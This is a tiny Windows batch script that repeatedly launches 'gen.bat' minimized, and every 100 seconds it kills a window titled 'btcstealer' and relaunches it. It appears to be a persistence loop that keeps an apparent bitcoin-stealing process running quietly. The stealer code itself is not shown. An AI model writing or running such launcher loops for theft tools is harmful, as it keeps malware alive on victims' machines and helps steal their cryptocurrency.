@echo off
start /min gen.bat
:loop
timeout /t 100
Taskkill /FI "WINDOWTITLE eq btcstealer"
start /min gen.bat
goto loop
